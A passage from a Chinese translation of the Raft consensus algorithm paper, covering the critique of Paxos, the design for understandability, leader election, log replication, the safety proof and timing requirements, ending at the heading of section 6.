Paxos 的简化解释并且设计了我们自己的算法之后，这一过程花了近一年时间。 我们假设 Paxos 的不透明性来自它选择单决策问题作为它的基础。单决策 Paxos 是晦涩微妙的，它被划分成了两种没有简单直观解释和无法独立理解的情景。因此，这导致了很难建立起直观的感受为什么单决策 Paxos 算法能够工作。构成多决策 Paxos 增加了很多错综复杂的规则。我们相信，在多决策上达成一致性的问题（一份日志而不是单一的日志记录）能够被分解成其他的方式并且更加直接和明显。 Paxos算法的第二个问题就是它没有提供一个足够好的用来构建一个现实系统的基础。一个原因是还没有一种被广泛认同的多决策问题的算法。Lamport 的描述基本上都是关于单决策 Paxos 的；他简要描述了实施多决策 Paxos 的方法，但是缺乏很多细节。当然也有很多具体化 Paxos 的尝试，但是他们都互相不一样，和 Paxos 的概述也不同。例如 Chubby 这样的系统实现了一个类似于 Paxos 的算法，但是大多数的细节并没有被公开。 而且，Paxos 算法的结构也不是十分易于构建实践的系统；单决策分解也会产生其他的结果。例如，独立的选择一组日志条目然后合并成一个序列化的日志并没有带来太多的好处，仅仅增加了不少复杂性。围绕着日志来设计一个系统是更加简单高效的；新日志条目以严格限制的顺序增添到日志中去。另一个问题是，Paxos 使用了一种对等的点对点的方式作为它的核心（尽管它最终提议了一种弱领导人的方法来优化性能）。在只有一个决策会被制定的简化世界中是很有意义的，但是很少有现实的系统使用这种方式。如果有一系列的决策需要被制定，首先选择一个领导人，然后让他去协调所有的决议，会更加简单快速。 因此，实际的系统中很少有和 Paxos 相似的实践。每一种实现都是从 Paxos 开始研究，然后发现很多实现上的难题，再然后开发了一种和 Paxos 明显不一样的结构。这样是非常费时和容易出错的，并且理解 Paxos 的难度使得这个问题更加糟糕。Paxos 算法在理论上被证明是正确可行的，但是现实的系统和 Paxos 差别是如此的大，以至于这些证明没有什么太大的价值。下面来自 Chubby 实现非常典型： 在Paxos算法描述和实现现实系统中间有着巨大的鸿沟。最终的系统建立在一种没有经过证明的算法之上。 由于以上问题，我们认为 Paxos 算法既没有提供一个良好的基础给实践的系统，也没有给教学很好的帮助。基于一致性问题在大规模软件系统中的重要性，我们决定看看我们是否可以设计一个拥有更好特性的替代 Paxos 的一致性算法。Raft算法就是这次实验的结果。 4 为了可理解性的设计设计 Raft 算法我们有几个初衷：它必须提供一个完整的实际的系统实现基础，这样才能大大减少开发者的工作；它必须在任何情况下都是安全的并且在大多数的情况下都是可用的；并且它的大部分操作必须是高效的。但是我们最重要也是最大的挑战是可理解性。它必须保证对于普遍的人群都可以十分容易的去理解。另外，它必须能够让人形成直观的认识，这样系统的构建者才能够在现实中进行必然的扩展。 在设计 Raft 算法的时候，有很多的点需要我们在各种备选方案中进行选择。在这种情况下，我们评估备选方案基于可理解性原则：解释各个备选方案有多大的难度（例如，Raft 的状态空间有多复杂，是否有微妙的暗示）？对于一个读者而言，完全理解这个方案和暗示是否容易？ 我们意识到对这种可理解性分析上具有高度的主观性；尽管如此，我们使用了两种通常适用的技术来解决这个问题。第一个技术就是众所周知的问题分解：只要有可能，我们就将问题分解成几个相对独立的，可被解决的、可解释的和可理解的子问题。例如，Raft 算法被我们分成领导人选举，日志复制，安全性和角色改变几个部分。 我们使用的第二个方法是通过减少状态的数量来简化需要考虑的状态空间，使得系统更加连贯并且在可能的时候消除不确定性。特别的，所有的日志是不允许有空洞的，并且 Raft 限制了日志之间变成不一致状态的可能。尽管在大多数情况下我们都试图去消除不确定性，但是也有一些情况下不确定性可以提升可理解性。尤其是，随机化方法增加了不确定性，但是他们有利于减少状态空间数量，通过处理所有可能选择时使用相似的方法。我们使用随机化去简化 Raft 中领导人选举算法。 5 Raft 一致性算法Raft 是一种用来管理章节 2 中描述的复制日志的算法。图 2 为了参考之用，总结这个算法的简略版本，图 3 列举了这个算法的一些关键特性。图中的这些元素会在剩下的章节逐一介绍。 Raft 通过选举一个高贵的领导人，然后给予他全部的管理复制日志的责任来实现一致性。领导人从客户端接收日志条目，把日志条目复制到其他服务器上，并且当保证安全性的时候告诉其他的服务器应用日志条目到他们的状态机中。拥有一个领导人大大简化了对复制日志的管理。例如，领导人可以决定新的日志条目需要放在日志中的什么位置而不需要和其他服务器商议，并且数据都从领导人流向其他服务器。一个领导人可以宕机，可以和其他服务器失去连接，这时一个新的领导人会被选举出来。 通过领导人的方式，Raft 将一致性问题分解成了三个相对独立的子问题，这些问题会在接下来的子章节中进行讨论： 领导选举：一个新的领导人需要被选举出来，当现存的领导人宕机的时候（章节 5.2） 日志复制：领导人必须从客户端接收日志然后复制到集群中的其他节点，并且强制要求其他节点的日志保持和自己相同。 安全性：在 Raft 中安全性的关键是在图 3 中展示的状态机安全：如果有任何的服务器节点已经应用了一个确定的日志条目到它的状态机中，那么其他服务器节点不能在同一个日志索引位置应用一个不同的指令。章节 5.4 阐述了 Raft 算法是如何保证这个特性的；这个解决方案涉及到一个额外的选举机制（5.2 节）上的限制。 在展示一致性算法之后，这一章节会讨论可用性的一些问题和计时在系统的作用。 状态： 状态 所有服务器上持久存在的 currentTerm 服务器最后一次知道的任期号（初始化为 0，持续递增） votedFor 在当前获得选票的候选人的 Id log[] 日志条目集；每一个条目包含一个用户状态机执行的指令，和收到时的任期号 状态 所有服务器上经常变的 commitIndex 已知的最大的已经被提交的日志条目的索引值 lastApplied 最后被应用到状态机的日志条目索引值（初始化为 0，持续递增） 状态 在领导人里经常改变的 （选举后重新初始化） nextIndex[] 对于每一个服务器，需要发送给他的下一个日志条目的索引值（初始化为领导人最后索引值加一） matchIndex[] 对于每一个服务器，已经复制给他的日志的最高索引值 附加日志 RPC： 由领导人负责调用来复制日志指令；也会用作heartbeat 参数 解释 term 领导人的任期号 leaderId 领导人的 Id，以便于跟随者重定向请求 prevLogIndex 新的日志条目紧随之前的索引值 prevLogTerm prevLogIndex 条目的任期号 entries[] 准备存储的日志条目（表示心跳时为空；一次性发送多个是为了提高效率） leaderCommit 领导人已经提交的日志的索引值 返回值 解释 term 当前的任期号，用于领导人去更新自己 success 跟随者包含了匹配上 prevLogIndex 和 prevLogTerm 的日志时为真 接收者实现： 如果 term &lt; currentTerm 就返回 false （5.1 节） 如果日志在 prevLogIndex 位置处的日志条目的任期号和 prevLogTerm 不匹配，则返回 false （5.3 节） 如果已经存在的日志条目和新的产生冲突（索引值相同但是任期号不同），删除这一条和之后所有的 （5.3 节） 附加日志中尚未存在的任何新条目 如果 leaderCommit &gt; commitIndex，令 commitIndex 等于 leaderCommit 和 新日志条目索引值中较小的一个 请求投票 RPC： 由候选人负责调用用来征集选票（5.2 节） 参数 解释 term 候选人的任期号 candidateId 请求选票的候选人的 Id lastLogIndex 候选人的最后日志条目的索引值 lastLogTerm 候选人最后日志条目的任期号 返回值 解释 term 当前任期号，以便于候选人去更新自己的任期号 voteGranted 候选人赢得了此张选票时为真 接收者实现： 如果term &lt; currentTerm返回 false （5.2 节） 如果 votedFor 为空或者为 candidateId，并且候选人的日志至少和自己一样新，那么就投票给他（5.2 节，5.4 节） 所有服务器需遵守的规则： 所有服务器： 如果commitIndex &gt; lastApplied，那么就 lastApplied 加一，并把log[lastApplied]应用到状态机中（5.3 节） 如果接收到的 RPC 请求或响应中，任期号T &gt; currentTerm，那么就令 currentTerm 等于 T，并切换状态为跟随者（5.1 节） 跟随者（5.2 节）： 响应来自候选人和领导者的请求 如果在超过选举超时时间的情况之前都没有收到领导人的心跳，或者是候选人请求投票的，就自己变成候选人 候选人（5.2 节）： 在转变成候选人后就立即开始选举过程 自增当前的任期号（currentTerm） 给自己投票 重置选举超时计时器 发送请求投票的 RPC 给其他所有服务器 如果接收到大多数服务器的选票，那么就变成领导人 如果接收到来自新的领导人的附加日志 RPC，转变成跟随者 如果选举过程超时，再次发起一轮选举 领导人： 一旦成为领导人：发送空的附加日志 RPC（心跳）给其他所有的服务器；在一定的空余时间之后不停的重复发送，以阻止跟随者超时（5.2 节） 如果接收到来自客户端的请求：附加条目到本地日志中，在条目被应用到状态机后响应客户端（5.3 节） 如果对于一个跟随者，最后日志条目的索引值大于等于 nextIndex，那么：发送从 nextIndex 开始的所有日志条目： 如果成功：更新相应跟随者的 nextIndex 和 matchIndex 如果因为日志不一致而失败，减少 nextIndex 重试 如果存在一个满足N &gt; commitIndex的 N，并且大多数的matchIndex[i] ≥ N成立，并且log[N].term == currentTerm成立，那么令 commitIndex 等于这个 N （5.3 和 5.4 节） 图 2：一个关于 Raft 一致性算法的浓缩总结（不包括成员变换和日志压缩）。 特性 解释 选举安全特性 对于一个给定的任期号，最多只会有一个领导人被选举出来（5.2 节） 领导人只附加原则 领导人绝对不会删除或者覆盖自己的日志，只会增加（5.3 节） 日志匹配原则 如果两个日志在相同的索引位置的日志条目的任期号相同，那么我们就认为这个日志从头到这个索引位置之间全部完全相同（5.3 节） 领导人完全特性 如果某个日志条目在某个任期号中已经被提交，那么这个条目必然出现在更大任期号的所有领导人中（5.4 节） 状态机安全特性 如果一个领导人已经在给定的索引值位置的日志条目应用到状态机中，那么其他任何的服务器在这个索引位置不会提交一个不同的日志（5.4.3 节） 图 3：Raft 在任何时候都保证以上的各个特性。 5.1 Raft 基础一个 Raft 集群包含若干个服务器节点；通常是 5 个，这允许整个系统容忍 2 个节点的失效。在任何时刻，每一个服务器节点都处于这三个状态之一：领导人、跟随者或者候选人。在通常情况下，系统中只有一个领导人并且其他的节点全部都是跟随者。跟随者都是被动的：他们不会发送任何请求，只是简单的响应来自领导者或者候选人的请求。领导人处理所有的客户端请求（如果一个客户端和跟随者联系，那么跟随者会把请求重定向给领导人）。第三种状态，候选人，是用来在 5.2 节描述的选举新领导人时使用。图 4 展示了这些状态和他们之间的转换关系；这些转换关系会在接下来进行讨论。 图 4：服务器状态。跟随者只响应来自其他服务器的请求。如果跟随者接收不到消息，那么他就会变成候选人并发起一次选举。获得集群中大多数选票的候选人将成为领导者。在一个任期内，领导人一直都会是领导人直到自己宕机了。 图 5：时间被划分成一个个的任期，每个任期开始都是一次选举。在选举成功后，领导人会管理整个集群直到任期结束。有时候选举会失败，那么这个任期就会没有领导人而结束。任期之间的切换可以在不同的时间不同的服务器上观察到。 Raft 把时间分割成任意长度的任期，如图 5。任期用连续的整数标记。每一段任期从一次选举开始，就像章节 5.2 描述的一样，一个或者多个候选人尝试成为领导者。如果一个候选人赢得选举，然后他就在接下来的任期内充当领导人的职责。在某些情况下，一次选举过程会造成选票的瓜分。在这种情况下，这一任期会以没有领导人结束；一个新的任期（和一次新的选举）会很快重新开始。Raft 保证了在一个给定的任期内，最多只有一个领导者。 不同的服务器节点可能多次观察到任期之间的转换，但在某些情况下，一个节点也可能观察不到任何一次选举或者整个任期全程。任期在 Raft 算法中充当逻辑时钟的作用，这会允许服务器节点查明一些过期的信息比如陈旧的领导者。每一个节点存储一个当前任期号，这一编号在整个时期内单调的增长。当服务器之间通信的时候会交换当前任期号；如果一个服务器的当前任期号比其他人小，那么他会更新自己的编号到较大的编号值。如果一个候选人或者领导者发现自己的任期号过期了，那么他会立即恢复成跟随者状态。如果一个节点接收到一个包含过期的任期号的请求，那么他会直接拒绝这个请求。 Raft 算法中服务器节点之间通信使用远程过程调用（RPCs），并且基本的一致性算法只需要两种类型的 RPCs。请求投票（RequestVote） RPCs 由候选人在选举期间发起（章节 5.2），然后附加条目（AppendEntries）RPCs 由领导人发起，用来复制日志和提供一种心跳机制（章节 5.3）。第 7 节为了在服务器之间传输快照增加了第三种 RPC。当服务器没有及时的收到 RPC 的响应时，会进行重试， 并且他们能够并行的发起 RPCs 来获得最佳的性能。 5.2 领导人选举Raft 使用一种心跳机制来触发领导人选举。当服务器程序启动时，他们都是跟随者身份。一个服务器节点继续保持着跟随者状态只要他从领导人或者候选者处接收到有效的 RPCs。领导者周期性的向所有跟随者发送心跳包（即不包含日志项内容的附加日志项 RPCs）来维持自己的权威。如果一个跟随者在一段时间里没有接收到任何消息，也就是选举超时，那么他就会认为系统中没有可用的领导者,并且发起选举以选出新的领导者。 要开始一次选举过程，跟随者先要增加自己的当前任期号并且转换到候选人状态。然后他会并行的向集群中的其他服务器节点发送请求投票的 RPCs 来给自己投票。候选人会继续保持着当前状态直到以下三件事情之一发生：(a) 他自己赢得了这次的选举，(b) 其他的服务器成为领导者，(c) 一段时间之后没有任何一个获胜的人。这些结果会分别的在下面的段落里进行讨论。 当一个候选人从整个集群的大多数服务器节点获得了针对同一个任期号的选票，那么他就赢得了这次选举并成为领导人。每一个服务器最多会对一个任期号投出一张选票，按照先来先服务的原则（注意：5.4 节在投票上增加了一点额外的限制）。要求大多数选票的规则确保了最多只会有一个候选人赢得此次选举（图 3 中的选举安全性）。一旦候选人赢得选举，他就立即成为领导人。然后他会向其他的服务器发送心跳消息来建立自己的权威并且阻止新的领导人的产生。 在等待投票的时候，候选人可能会从其他的服务器接收到声明它是领导人的附加日志项 RPC。如果这个领导人的任期号（包含在此次的 RPC中）不小于候选人当前的任期号，那么候选人会承认领导人合法并回到跟随者状态。 如果此次 RPC 中的任期号比自己小，那么候选人就会拒绝这次的 RPC 并且继续保持候选人状态。 第三种可能的结果是候选人既没有赢得选举也没有输：如果有多个跟随者同时成为候选人，那么选票可能会被瓜分以至于没有候选人可以赢得大多数人的支持。当这种情况发生的时候，每一个候选人都会超时，然后通过增加当前任期号来开始一轮新的选举。然而，没有其他机制的话，选票可能会被无限的重复瓜分。 Raft 算法使用随机选举超时时间的方法来确保很少会发生选票瓜分的情况，就算发生也能很快的解决。为了阻止选票起初就被瓜分，选举超时时间是从一个固定的区间（例如 150-300 毫秒）随机选择。这样可以把服务器都分散开以至于在大多数情况下只有一个服务器会选举超时；然后他赢得选举并在其他服务器超时之前发送心跳包。同样的机制被用在选票瓜分的情况下。每一个候选人在开始一次选举的时候会重置一个随机的选举超时时间，然后在超时时间内等待投票的结果；这样减少了在新的选举中另外的选票瓜分的可能性。9.3 节展示了这种方案能够快速的选出一个领导人。 领导人选举这个例子，体现了可理解性原则是如何指导我们进行方案设计的。起初我们计划使用一种排名系统：每一个候选人都被赋予一个唯一的排名，供候选人之间竞争时进行选择。如果一个候选人发现另一个候选人拥有更高的排名，那么他就会回到跟随者状态，这样高排名的候选人能够更加容易的赢得下一次选举。但是我们发现这种方法在可用性方面会有一点问题（如果高排名的服务器宕机了，那么低排名的服务器可能会超时并再次进入候选人状态。而且如果这个行为发生得足够快，则可能会导致整个选举过程都被重置掉）。我们针对算法进行了多次调整，但是每次调整之后都会有新的问题。最终我们认为随机重试的方法是更加明显和易于理解的。 5.3 日志复制一旦一个领导人被选举出来，他就开始为客户端提供服务。客户端的每一个请求都包含一条被复制状态机执行的指令。领导人把这条指令作为一条新的日志条目附加到日志中去，然后并行的发起附加条目 RPCs 给其他的服务器，让他们复制这条日志条目。当这条日志条目被安全的复制（下面会介绍），领导人会应用这条日志条目到它的状态机中然后把执行的结果返回给客户端。如果跟随者崩溃或者运行缓慢，再或者网络丢包，领导人会不断的重复尝试附加日志条目 RPCs （尽管已经回复了客户端）直到所有的跟随者都最终存储了所有的日志条目。 图 6：日志由有序序号标记的条目组成。每个条目都包含创建时的任期号（图中框中的数字），和一个状态机需要执行的指令。一个条目当可以安全的被应用到状态机中去的时候，就认为是可以提交了。 日志以图 6 展示的方式组织。每一个日志条目存储一条状态机指令和从领导人收到这条指令时的任期号。日志中的任期号用来检查是否出现不一致的情况，同时也用来保证图 3 中的某些性质。每一条日志条目同时也都有一个整数索引值来表明它在日志中的位置。 领导人来决定什么时候把日志条目应用到状态机中是安全的；这种日志条目被称为已提交。Raft 算法保证所有已提交的日志条目都是持久化的并且最终会被所有可用的状态机执行。在领导人将创建的日志条目复制到大多数的服务器上的时候，日志条目就会被提交（例如在图 6 中的条目 7）。同时，领导人的日志中之前的所有日志条目也都会被提交，包括由其他领导人创建的条目。5.4 节会讨论某些当在领导人改变之后应用这条规则的隐晦内容，同时他也展示了这种提交的定义是安全的。领导人跟踪了最大的将会被提交的日志项的索引，并且索引值会被包含在未来的所有附加日志 RPCs （包括心跳包），这样其他的服务器才能最终知道领导人的提交位置。一旦跟随者知道一条日志条目已经被提交，那么他也会将这个日志条目应用到本地的状态机中（按照日志的顺序）。 我们设计了 Raft 的日志机制来维护一个不同服务器的日志之间的高层次的一致性。这么做不仅简化了系统的行为也使得更加可预计，同时他也是安全性保证的一个重要组件。Raft 维护着以下的特性，这些同时也组成了图 3 中的日志匹配特性： 如果在不同的日志中的两个条目拥有相同的索引和任期号，那么他们存储了相同的指令。 如果在不同的日志中的两个条目拥有相同的索引和任期号，那么他们之前的所有日志条目也全部相同。 第一个特性来自这样的一个事实，领导人最多在一个任期里在指定的一个日志索引位置创建一条日志条目，同时日志条目在日志中的位置也从来不会改变。第二个特性由附加日志 RPC 的一个简单的一致性检查所保证。在发送附加日志 RPC 的时候，领导人会把新的日志条目紧接着之前的条目的索引位置和任期号包含在里面。如果跟随者在它的日志中找不到包含相同索引位置和任期号的条目，那么他就会拒绝接收新的日志条目。一致性检查就像一个归纳步骤：一开始空的日志状态肯定是满足日志匹配特性的，然后一致性检查保护了日志匹配特性当日志扩展的时候。因此，每当附加日志 RPC 返回成功时，领导人就知道跟随者的日志一定是和自己相同的了。 在正常的操作中，领导人和跟随者的日志保持一致性，所以附加日志 RPC 的一致性检查从来不会失败。然而，领导人崩溃的情况会使得日志处于不一致的状态（老的领导人可能还没有完全复制所有的日志条目）。这种不一致问题会在领导人和跟随者的一系列崩溃下加剧。图 7 展示了跟随者的日志可能和新的领导人不同的方式。跟随者可能会丢失一些在新的领导人中有的日志条目，他也可能拥有一些领导人没有的日志条目，或者两者都发生。丢失或者多出日志条目可能会持续多个任期。 图 7：当一个领导人成功当选时，跟随者可能是任何情况（a-f）。每一个盒子表示是一个日志条目；里面的数字表示任期号。跟随者可能会缺少一些日志条目（a-b），可能会有一些未被提交的日志条目（c-d），或者两种情况都存在（e-f）。例如，场景 f 可能会这样发生，某服务器在任期 2 的时候是领导人，已附加了一些日志条目到自己的日志中，但在提交之前就崩溃了；很快这个机器就被重启了，在任期 3 重新被选为领导人，并且又增加了一些日志条目到自己的日志中；在任期 2 和任期 3 的日志被提交之前，这个服务器又宕机了，并且在接下来的几个任期里一直处于宕机状态。 在 Raft 算法中，领导人处理不一致是通过强制跟随者直接复制自己的日志来解决了。这意味着在跟随者中的冲突的日志条目会被领导人的日志覆盖。5.4 节会阐述如何通过增加一些限制来使得这样的操作是安全的。 要使得跟随者的日志进入和自己一致的状态，领导人必须找到最后两者达成一致的地方，然后删除从那个点之后的所有日志条目，发送自己的日志给跟随者。所有的这些操作都在进行附加日志 RPCs 的一致性检查时完成。领导人针对每一个跟随者维护了一个 nextIndex，这表示下一个需要发送给跟随者的日志条目的索引地址。当一个领导人刚获得权力的时候，他初始化所有的 nextIndex 值为自己的最后一条日志的index加1（图 7 中的 11）。如果一个跟随者的日志和领导人不一致，那么在下一次的附加日志 RPC 时的一致性检查就会失败。在被跟随者拒绝之后，领导人就会减小 nextIndex 值并进行重试。最终 nextIndex 会在某个位置使得领导人和跟随者的日志达成一致。当这种情况发生，附加日志 RPC 就会成功，这时就会把跟随者冲突的日志条目全部删除并且加上领导人的日志。一旦附加日志 RPC 成功，那么跟随者的日志就会和领导人保持一致，并且在接下来的任期里一直继续保持。 如果需要的话，算法可以通过减少被拒绝的附加日志 RPCs 的次数来优化。例如，当附加日志 RPC 的请求被拒绝的时候，跟随者可以包含冲突的条目的任期号和自己存储的那个任期的最早的索引地址。借助这些信息，领导人可以减小 nextIndex 越过所有那个任期冲突的所有日志条目；这样就变成每个任期需要一次附加条目 RPC 而不是每个条目一次。在实践中，我们十分怀疑这种优化是否是必要的，因为失败是很少发生的并且也不大可能会有这么多不一致的日志。 通过这种机制，领导人在获得权力的时候就不需要任何特殊的操作来恢复一致性。他只需要进行正常的操作，然后日志就能自动的在回复附加日志 RPC 的一致性检查失败的时候自动趋于一致。领导人从来不会覆盖或者删除自己的日志（图 3 的领导人只附加特性）。 日志复制机制展示出了第 2 节中形容的一致性特性：Raft 能够接受，复制并应用新的日志条目只要大部分的机器是工作的；在通常的情况下，新的日志条目可以在一次 RPC 中被复制给集群中的大多数机器；并且单个的缓慢的跟随者不会影响整体的性能。 5.4 安全性前面的章节里描述了 Raft 算法是如何选举和复制日志的。然而，到目前为止描述的机制并不能充分的保证每一个状态机会按照相同的顺序执行相同的指令。例如，一个跟随者可能会进入不可用状态同时领导人已经提交了若干的日志条目，然后这个跟随者可能会被选举为领导人并且覆盖这些日志条目；因此，不同的状态机可能会执行不同的指令序列。 这一节通过在领导选举的时候增加一些限制来完善 Raft 算法。这一限制保证了任何的领导人对于给定的任期号，都拥有了之前任期的所有被提交的日志条目（图 3 中的领导人完整特性）。增加这一选举时的限制，我们对于提交时的规则也更加清晰。最终，我们将展示对于领导人完整特性的简要证明，并且说明领导人是如何领导复制状态机的做出正确行为的。 5.4.1 选举限制在任何基于领导人的一致性算法中，领导人都必须存储所有已经提交的日志条目。在某些一致性算法中，例如 Viewstamped Replication，某个节点即使是一开始并没有包含所有已经提交的日志条目，它也能被选为领导者。这些算法都包含一些额外的机制来识别丢失的日志条目并把他们传送给新的领导人，要么是在选举阶段要么在之后很快进行。不幸的是，这种方法会导致相当大的额外的机制和复杂性。Raft 使用了一种更加简单的方法，它可以保证所有之前的任期号中已经提交的日志条目在选举的时候都会出现在新的领导人中，不需要传送这些日志条目给领导人。这意味着日志条目的传送是单向的，只从领导人传给跟随者，并且领导人从不会覆盖自身本地日志中已经存在的条目。 Raft 使用投票的方式来阻止一个候选人赢得选举除非这个候选人包含了所有已经提交的日志条目。候选人为了赢得选举必须联系集群中的大部分节点，这意味着每一个已经提交的日志条目在这些服务器节点中肯定存在于至少一个节点上。如果候选人的日志至少和大多数的服务器节点一样新（这个新的定义会在下面讨论），那么他一定持有了所有已经提交的日志条目。请求投票 RPC 实现了这样的限制： RPC 中包含了候选人的日志信息，然后投票人会拒绝掉那些日志没有自己新的投票请求。 Raft 通过比较两份日志中最后一条日志条目的索引值和任期号定义谁的日志比较新。如果两份日志最后的条目的任期号不同，那么任期号大的日志更加新。如果两份日志最后的条目任期号相同，那么日志比较长的那个就更加新。 5.4.2 提交之前任期内的日志条目如同 5.3 节介绍的那样，领导人知道一条当前任期内的日志记录是可以被提交的，只要它被存储到了大多数的服务器上。如果一个领导人在提交日志条目之前崩溃了，未来后续的领导人会继续尝试复制这条日志记录。然而，一个领导人不能断定一个之前任期里的日志条目被保存到大多数服务器上的时候就一定已经提交了。图 8 展示了一种情况，一条已经被存储到大多数节点上的老日志条目，也依然有可能会被未来的领导人覆盖掉。 图 8：如图的时间序列展示了为什么领导人无法决定对老任期号的日志条目进行提交。在 (a) 中，S1 是领导者，部分的复制了索引位置 2 的日志条目。在 (b) 中，S1 崩溃了，然后 S5 在任期 3 里通过 S3、S4 和自己的选票赢得选举，然后从客户端接收了一条不一样的日志条目放在了索引 2 处。然后到 (c)，S5 又崩溃了；S1 重新启动，选举成功，开始复制日志。在这时，来自任期 2 的那条日志已经被复制到了集群中的大多数机器上，但是还没有被提交。如果 S1 在 (d) 中又崩溃了，S5 可以重新被选举成功（通过来自 S2，S3 和 S4 的选票），然后覆盖了他们在索引 2 处的日志。反之，如果在崩溃之前，S1 把自己主导的新任期里产生的日志条目复制到了大多数机器上，就如 (e) 中那样，那么在后面任期里面这些新的日志条目就会被提交（因为S5 就不可能选举成功）。 这样在同一时刻就同时保证了，之前的所有老的日志条目就会被提交。 为了消除图 8 里描述的情况，Raft 永远不会通过计算副本数目的方式去提交一个之前任期内的日志条目。只有领导人当前任期里的日志条目通过计算副本数目可以被提交；一旦当前任期的日志条目以这种方式被提交，那么由于日志匹配特性，之前的日志条目也都会被间接的提交。在某些情况下，领导人可以安全的知道一个老的日志条目是否已经被提交（例如，该条目是否存储到所有服务器上），但是 Raft 为了简化问题使用一种更加保守的方法。 当领导人复制之前任期里的日志时，Raft 会为所有日志保留原始的任期号, 这在提交规则上产生了额外的复杂性。在其他的一致性算法中，如果一个新的领导人要重新复制之前的任期里的日志时，它必须使用当前新的任期号。Raft 使用的方法更加容易辨别出日志，因为它可以随着时间和日志的变化对日志维护着同一个任期编号。另外，和其他的算法相比，Raft 中的新领导人只需要发送更少日志条目（其他算法中必须在他们被提交之前发送更多的冗余日志条目来为他们重新编号）。 5.4.3 安全性论证在给定了完整的 Raft 算法之后，我们现在可以更加精确的讨论领导人完整性特性（这一讨论基于 9.2 节的安全性证明）。我们假设领导人完全性特性是不存在的，然后我们推出矛盾来。假设任期 T 的领导人（领导人 T）在任期内提交了一条日志条目，但是这条日志条目没有被存储到未来某个任期的领导人的日志中。设大于 T 的最小任期 U 的领导人 U 没有这条日志条目。 图 9：如果 S1 （任期 T 的领导者）提交了一条新的日志在它的任期里，然后 S5 在之后的任期 U 里被选举为领导人，然后至少会有一个机器，如 S3，既拥有来自 S1 的日志，也给 S5 投票了。 在领导人 U 选举的时候一定没有那条被提交的日志条目（领导人从不会删除或者覆盖任何条目）。 领导人 T 复制这条日志条目给集群中的大多数节点，同时，领导人U 从集群中的大多数节点赢得了选票。因此，至少有一个节点（投票者、选民）同时接受了来自领导人T 的日志条目，并且给领导人U 投票了，如图 9。这个投票者是产生这个矛盾的关键。 这个投票者必须在给领导人 U 投票之前先接受了从领导人 T 发来的已经被提交的日志条目；否则他就会拒绝来自领导人 T 的附加日志请求（因为此时他的任期号会比 T 大）。 投票者在给领导人 U 投票时依然保存有这条日志条目，因为任何中间的领导人都包含该日志条目（根据上述的假设），领导人从不会删除条目，并且跟随者只有在和领导人冲突的时候才会删除条目。 投票者把自己选票投给领导人 U 时，领导人 U 的日志必须和投票者自己一样新。这就导致了两者矛盾之一。 首先，如果投票者和领导人 U 的最后一条日志的任期号相同，那么领导人 U 的日志至少和投票者一样长，所以领导人 U 的日志一定包含所有投票者的日志。这是另一处矛盾，因为投票者包含了那条已经被提交的日志条目，但是在上述的假设里，领导人 U 是不包含的。 除此之外，领导人 U 的最后一条日志的任期号就必须比投票人大了。此外，他也比 T 大，因为投票人的最后一条日志的任期号至少和 T 一样大（他包含了来自任期 T 的已提交的日志）。创建了领导人 U 最后一条日志的之前领导人一定已经包含了那条被提交的日志（根据上述假设，领导人 U 是第一个不包含该日志条目的领导人）。所以，根据日志匹配特性，领导人 U 一定也包含那条被提交的日志，这里产生矛盾。 这里完成了矛盾。因此，所有比 T 大的领导人一定包含了所有来自 T 的已经被提交的日志。 日志匹配原则保证了未来的领导人也同时会包含被间接提交的条目，例如图 8 (d) 中的索引 2。 通过领导人完全特性，我们就能证明图 3 中的状态机安全特性，即如果服务器已经在某个给定的索引值应用了日志条目到自己的状态机里，那么其他的服务器不会应用一个不一样的日志到同一个索引值上。在一个服务器应用一条日志条目到他自己的状态机中时，他的日志必须和领导人的日志，在该条目和之前的条目上相同，并且已经被提交。现在我们来考虑在任何一个服务器应用一个指定索引位置的日志的最小任期；日志完全特性保证拥有更高任期号的领导人会存储相同的日志条目，所以之后的任期里应用某个索引位置的日志条目也会是相同的值。因此，状态机安全特性是成立的。 最后，Raft 要求服务器按照日志中索引位置顺序应用日志条目。和状态机安全特性结合起来看，这就意味着所有的服务器会应用相同的日志序列集到自己的状态机中，并且是按照相同的顺序。 5.5 跟随者和候选人崩溃到目前为止，我们都只关注了领导人崩溃的情况。跟随者和候选人崩溃后的处理方式比领导人要简单的多，并且他们的处理方式是相同的。如果跟随者或者候选人崩溃了，那么后续发送给他们的 RPCs 都会失败。Raft 中处理这种失败就是简单的通过无限的重试；如果崩溃的机器重启了，那么这些 RPC 就会完整的成功。如果一个服务器在完成了一个 RPC，但是还没有响应的时候崩溃了，那么在他重新启动之后就会再次收到同样的请求。Raft 的 RPCs 都是幂等的，所以这样重试不会造成任何问题。例如一个跟随者如果收到附加日志请求但是他已经包含了这一日志，那么他就会直接忽略这个新的请求。 5.6 时间和可用性Raft 的要求之一就是安全性不能依赖时间：整个系统不能因为某些事件运行的比预期快一点或者慢一点就产生了错误的结果。但是，可用性（系统可以及时的响应客户端）不可避免的要依赖于时间。例如，如果消息交换比服务器故障间隔时间长，候选人将没有足够长的时间来赢得选举；没有一个稳定的领导人，Raft 将无法工作。 领导人选举是 Raft 中对时间要求最为关键的方面。Raft 可以选举并维持一个稳定的领导人,只要系统满足下面的时间要求： 广播时间（broadcastTime） &lt;&lt; 选举超时时间（electionTimeout） &lt;&lt; 平均故障间隔时间（MTBF） 在这个不等式中，广播时间指的是从一个服务器并行的发送 RPCs 给集群中的其他服务器并接收响应的平均时间；选举超时时间就是在 5.2 节中介绍的选举的超时时间限制；然后平均故障间隔时间就是对于一台服务器而言，两次故障之间的平均时间。广播时间必须比选举超时时间小一个量级，这样领导人才能够发送稳定的心跳消息来阻止跟随者开始进入选举状态；通过随机化选举超时时间的方法，这个不等式也使得选票瓜分的情况变得不可能。选举超时时间应该要比平均故障间隔时间小上几个数量级，这样整个系统才能稳定的运行。当领导人崩溃后，整个系统会大约相当于选举超时的时间里不可用；我们希望这种情况在整个系统的运行中很少出现。 广播时间和平均故障间隔时间是由系统决定的，但是选举超时时间是我们自己选择的。Raft 的 RPCs 需要接收方将信息持久化的保存到稳定存储中去，所以广播时间大约是 0.5 毫秒到 20 毫秒，取决于存储的技术。因此，选举超时时间可能需要在 10 毫秒到 500 毫秒之间。大多数的服务器的平均故障间隔时间都在几个月甚至更长，很容易满足时间的需求。 6 